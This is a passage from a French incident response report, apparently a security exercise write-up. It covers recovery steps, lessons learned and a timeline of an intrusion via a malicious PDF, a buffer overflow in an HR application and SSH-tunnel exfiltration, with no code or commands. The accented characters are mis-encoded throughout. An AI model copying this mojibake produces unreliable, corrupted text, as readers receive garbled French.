- **Gestion des correctifs :** Acrobat Reader a Ã©tÃ© mis Ã  jour sur tous les postes. Un patch d'urgence a Ã©galement Ã©tÃ© dÃ©veloppÃ© et dÃ©ployÃ© sur lâ€™application RH vulnÃ©rable (**HR01**).
- **ProcÃ©dures de repli :** Des sauvegardes systÃ¨me ont Ã©tÃ© rÃ©alisÃ©es avant chaque mise Ã  jour pour permettre un retour rapide en cas dâ€™instabilitÃ©.

---

### **Ã‰tapes de RÃ©cupÃ©ration**

**Restauration des DonnÃ©es :**

- **Validation des sauvegardes :** Des contrÃ´les dâ€™intÃ©gritÃ© ont Ã©tÃ© rÃ©alisÃ©s via comparaison de checksums avant toute restauration.
- **Processus de restauration :** Les systÃ¨mes ont Ã©tÃ© restaurÃ©s Ã  partir de sauvegardes validÃ©es par lâ€™Ã©quipe SOC.
- **VÃ©rification de lâ€™intÃ©gritÃ© :** Des hachages cryptographiques (SHA-256) ont Ã©tÃ© gÃ©nÃ©rÃ©s pour s'assurer de l'authenticitÃ© des donnÃ©es restaurÃ©es.

**Validation des SystÃ¨mes :**

- **Mesures de sÃ©curitÃ© :** Les pare-feux et les systÃ¨mes de dÃ©tection dâ€™intrusion ont Ã©tÃ© mis Ã  jour avec les derniers IoCs identifiÃ©s.
- **Tests opÃ©rationnels :** Avant la remise en production, des tests de charge et de stabilitÃ© ont Ã©tÃ© rÃ©alisÃ©s.

---

### **Actions Post-Incident**

**Surveillance RenforcÃ©e :**

- **Nouveau plan de supervision :** Mise en place dâ€™une surveillance comportementale visant Ã  dÃ©tecter toute anomalie par rapport Ã  un profil dâ€™activitÃ© normal.
- **Outils utilisÃ©s :** Le SIEM Elastic sera configurÃ© avec de nouvelles rÃ¨gles de corrÃ©lation pour identifier les TTPs associÃ©s Ã  cet incident.

**Retour dâ€™ExpÃ©rience :**

- **Analyse des lacunes :** Lâ€™incident a mis en lumiÃ¨re des faiblesses concernant les contrÃ´les d'accÃ¨s, le filtrage des e-mails, la segmentation rÃ©seau et la sensibilisation aux attaques par hameÃ§onnage.
- **Recommandations :** Prioriser la gestion des actifs, le filtrage des courriels et le renforcement de la formation Ã  la cybersÃ©curitÃ©.
- **StratÃ©gie future :** Adopter une approche **Zero Trust**, segmenter plus finement le rÃ©seau, et investir davantage dans la formation et les outils de protection prÃ©ventive.

---

### **Annexe A â€“ Chronologie Technique**

| Heure | Ã‰vÃ©nement |
| --- | --- |
| 22 avril 2019, 00:27:27 | Un employÃ© ouvre un fichier PDF malveillant (`cv.pdf`) sur **WKST01**, exploitant une faille Acrobat Reader. Une charge utile s'exÃ©cute, Ã©tablissant un premier point dâ€™ancrage. |
| 22 avril 2019, 00:35:09 | AccÃ¨s non autorisÃ© Ã  des rÃ©pertoires contenant du code source et des clÃ©s API. |
| 22 avril 2019, 00:50:18 | Lâ€™attaquant effectue une reconnaissance et identifie un buffer overflow dans lâ€™application RH de **HR01**, quâ€™il exploite. |
| 22 avril 2019, 01:30:12 | AccÃ¨s Ã  une base de donnÃ©es non chiffrÃ©e contenant des donnÃ©es sensibles, exfiltrÃ©es via un tunnel SSH. |
| 22 avril 2019, 02:30:11 | Isolement de **WKST01** et **HR01** via segmentation VLAN. |
| 22 avril 2019, 03:10:14 | DÃ©ploiement de solutions de sÃ©curitÃ© pour collecter plus dâ€™informations sur les hÃ´tes compromis. |
| 22 avril 2019, 03:43:34 | Blocage de lâ€™IP C2 via les rÃ¨gles du pare-feu. |
| 22 avril 2019, 04:11:00 | Suppression du malware avec un outil spÃ©cialisÃ©. |
| 22 avril 2019, 04:30:00 | Mise Ã  jour dâ€™Acrobat Reader sur toutes les machines. |
| 22 avril 2019, 05:01:08 | RÃ©vocation des clÃ©s API compromises. |
| 22 avril 2019, 05:05:08 | RÃ©initialisation des identifiants des utilisateurs affectÃ©s. |
| 22 avril 2019, 05:21:20 | Restauration de **WKST01** depuis une sauvegarde vÃ©rifiÃ©e. |
| 22 avril 2019, 05:58:50 | Restauration de **HR01** depuis une sauvegarde vÃ©rifiÃ©e. |
| 22 avril 2019, 06:33:44 | DÃ©ploiement du correctif pour la vulnÃ©rabilitÃ© buffer overflow de lâ€™application RH. |
</aside>

<aside>
ğŸ’¡

**p4r3553                                                                  6/05/25**

        

</aside>